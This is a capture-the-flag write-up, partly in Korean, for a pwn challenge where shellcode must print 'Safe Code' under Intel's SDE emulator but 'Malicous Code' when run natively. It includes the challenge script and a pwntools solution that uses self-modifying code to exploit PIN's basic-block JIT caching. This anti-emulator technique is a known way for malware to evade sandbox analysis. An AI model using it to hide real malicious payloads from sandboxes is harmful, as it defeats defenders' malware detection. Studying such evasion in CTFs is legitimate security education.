# pwn-antivirus_sandbox

# Usage
- 2024.06#0

# Concept
- Intel PIN
- Code cache & Self-modifying code

# Writeup

####  chall.py
```python
import subprocess
import os

flag = os.getenv("FLAG")

program = input("Enter your program: (e.g. 23 2a 12)\n")
program = bytes.fromhex(program)

if len(program) > 0x100:
    print("[*] Too long")
    exit(0)

result = subprocess.run(["./intel-sde/sde64", "--", "./runner"], input=program, stdout=subprocess.PIPE)

if result.stdout == b"Safe Code\n":
    print("[*] Sandbox Pass")
else:
    print("[*] Sandbox Fail")
    exit(0)

result = subprocess.run(["./runner"], input=program, stdout=subprocess.PIPE)

if result.stdout == b"Malicous Code\n":
    print("[*] Runner Fail")
    print("Flag: %s" % flag)
else:
    print("[*] Runner Pass")
```

많은 악성코드 솔루션들이 의심 프로그램을 VM, Emulator 등의 샌드박스에서 실행한 이후 이상 행위가 발생하는지 감시하는 방식으로 악성코드를 탐지합니다. 이렇게 악성코드가 탐지되는 것을 막기 위해 악성코드 개발자들은 Anti-VM, Anti-Emulator와 같은 기술을 적용하여 샌드박스 내에서는 정상 프로그램처럼 행동하고 실제 환경에서만 악성 행위를 일으키도록 만들 수 있습니다.

이 문제는 Intel PIN 기반의 에뮬레이터인 SDE 안에서 실행했을 때와 native로 실행했을 때의 동작이 다르도록 하는 Anti-Emulator 기술을 요구합니다. 임의의 쉘코드를 입력 받은 후 SDE 안에서 실행했을 때에는 "Safe Code"를 출력하지만 그냥 실행했을 때에는 "Malicious Code를" 출력하도록 하는 쉘코드를 작성하면 플래그를 얻을 수 있습니다 

PIN을 속이는 방법은 여러 가지가 있을 수 있겠지만, 가장 편리한 것은 Self-Modifying Code를 이용하는 방식입니다. Intel PIN은 실행할 바이너리에서 Basic Block 단위로 Instruction을 Fetch해옵니다. 이후 각 instruction 사이에 SDE에서 사용하는 instrumentation을 삽입한 것을 JIT 방식으로 컴파일하여 실행하는 방식으로 Instrumentation을 구현합니다   
*JIT 방식이 사용되기 때문에 실행 속도가 느려지고, 이에 따른 시간 차이를 이용하는 방식으로 감지하는 것도 가능합니다.

정리하자면 Fetch - JIT Compilation - Execution의 방식이라고 할 수 있습니다. 이때 JIT로 컴파일되는 코드가 Self-modifying할 경우, PIN과 Native 실행의 차이를 만들 수 있습니다. 예시인 ex.py에서 사용한 쉘코드는 다음과 같습니다.

* 쉘코드
1. 2의 nop을 (jmp 4)로 패치함.
2. nop
3. write("Safe Code"); exit();
4. write("Malicious Code");

## Native로 실행할 때
1에서 2를 jmp 4로 패치합니다. 따라서 3의 코드는 실행되지 않고 4가 실행되어 "Malicious Code"가 출력됩니다.

## PIN에서 실행할 때
1-4는 syscall을 제외하면 control-flow가 이어지기 때문에 하나의 basic block으로 인식됩니다. PIN은 1-4를 한 번에 fetch한 다음, JIT로 컴파일하고 실행합니다. 따라서 "Safe Code"가 출력된 이후 프로그램이 종료됩니다.

#### ex.py
```python
from pwn import *
context.update(
    arch="amd64",
    endian="little",
    os="linux",
    # log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

p = remote("localhost", 11111)
# p = process(["python3", "chall.py"])

block = ""
block += shellcraft.echo("Safe Code\n")
block += shellcraft.exit(0)
block = asm(block)

payload = b""
payload += asm("mov DWORD PTR [rip+8], 0x2e")
payload += asm("mov BYTE PTR [rip], 0xe8")
payload += b"\x90"*5 
payload += block
payload += asm(shellcraft.echo("Malicous Code\n"))
payload = payload.hex()
p.sendlineafter(b"Enter your program:", payload)

p.interactive()
```
